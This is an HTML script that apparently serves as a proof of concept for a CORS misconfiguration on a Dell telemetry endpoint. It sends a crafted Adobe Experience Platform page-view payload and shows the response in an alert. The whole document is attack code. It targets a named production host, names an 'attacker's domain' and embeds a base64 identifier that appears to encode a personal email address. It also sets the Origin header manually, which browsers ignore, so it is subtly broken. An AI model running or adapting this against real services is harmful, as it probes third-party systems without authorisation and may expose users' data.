<script>
    // Malicious script to exploit CORS misconfiguration
    fetch("https://sm.dell.com/ee/v1/interact?configId=e7b04baa-ddef-4205-a38e-f327eae12a9f:prod&requestId=c270d259-f70f-46c4-b5d8-c11c41dc5e9e", {
        method: 'POST',
        headers: {
            'Content-Type': 'text/plain; charset=UTF-8',
            'Origin': 'https://shamlawi.github.io',  // Attacker's domain
        },
        body: JSON.stringify({
            "events": [{
                "xdm": {
                    "web": {
                        "webPageDetails": {
                            "URL": "https://mfm.dell.com/dashboard",
                            "name": "us|en|corp|gscm|myfinancials",
                            "pageViews": {"value": 1}
                        },
                        "webReferrer": {"URL": "https://www.dell.com/"}
                    },
                    "device": {
                        "screenHeight": 1169,
                        "screenWidth": 1800,
                        "screenOrientation": "landscape"
                    },
                    "environment": {
                        "type": "browser",
                        "browserDetails": {
                            "viewportWidth": 1800,
                            "viewportHeight": 1040}
                    },
                    "placeContext": {
                        "localTime": "2024-08-18T14:35:16.448+03:00",
                        "localTimezoneOffset": -180
                    },
                    "timestamp": "2024-08-18T11:35:16.448Z",
                    "implementationDetails": {
                        "name": "https://ns.adobe.com/experience/alloy",
                        "version": "2.1.0",
                        "environment": "browser"
                    },
                    "eventType": "page-view",
                    "_dell": {
                        "country": "us",
                        "language": "en",
                        "segment": "corp",
                        "customerset": "",
                        "cms": "gscm",
                        "pagename": "us|en|corp|gscm|myfinancials",
                        "applicationname": "MYFINANCIALS-APP",
                        "myaccountlogin": "true",
                        "badgeid": "eWhhbWxhd2lAZ21haWwuY29t",
                        "mcmid": "44164012036487836138436477290689724263",
                        "lwp": "?c=us&l=en&s=corp",
                        "urlval": "https://mfm.dell.com/dashboard",
                        "myaccount": "not logged in",
                        "consentval": "a",
                        "consentusrint": "",
                        "visitnum": "1"
                    }
                }
            }],
            "query": {"identity": {"fetch": ["ECID"]}},
            "meta": {"state": {"domain": "dell.com", "cookiesEnabled": true}}
        })
    })
    .then(response => response.text())
    .then(data => alert('Data received: ' + data))
    .catch(error => alert('Error: ' + error));
</script>

